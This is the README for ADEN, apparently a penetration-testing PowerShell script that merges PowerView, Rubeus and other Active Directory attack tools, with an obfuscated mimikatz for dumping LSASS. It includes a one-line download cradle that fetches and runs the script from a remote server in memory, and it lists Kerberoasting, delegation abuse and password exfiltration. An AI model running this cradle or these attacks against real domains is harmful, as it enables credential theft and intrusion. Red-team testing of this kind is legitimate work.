## What is this?
ADEN is a local enumeration script for active directory environments, it is a merge of several enumeration and exploitation projects:

- PowerView
- ASREPRoast
- Get-GPPPassword
- New-GPOImmediateTask
- Invoke-Rubeus


It is to be used as an all-in-one enumeration script to use when you are in a domain user's session. \
 \
An obfuscated version of mimikatz is included separately in order to dump LSASS: ```lsdmp.ps1```\
\
Big credits to all the authors of the above mentioned tools! You are awesome.

## How to use?
Once the script is loaded in-memory, the function ```Invoke-FullEnum``` will launch a full enumeration that will allow you to initially map the AD environment.

```powershell
iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-FullEnum
```
Keep in mind you also have access to all the functions of the above mentioned scripts. 

## What does it do?

ADEN currently supports the following attack scenarios:

- ASREPRoasting / Kerberoasting
- Unconstrained / Constrained / Resource Based Delegations
- DACL Abuse
- Local Admin Access
- GPP / LAPS / LDAP Password exfiltration

It also enumerates the following, non-directly attack-correlated information:

- Current/Root Domain Info
- Current user memberships and privileges
- Kerberos and Password Policies
- Trust relationships
- Domain users, groups, computers, fileservers
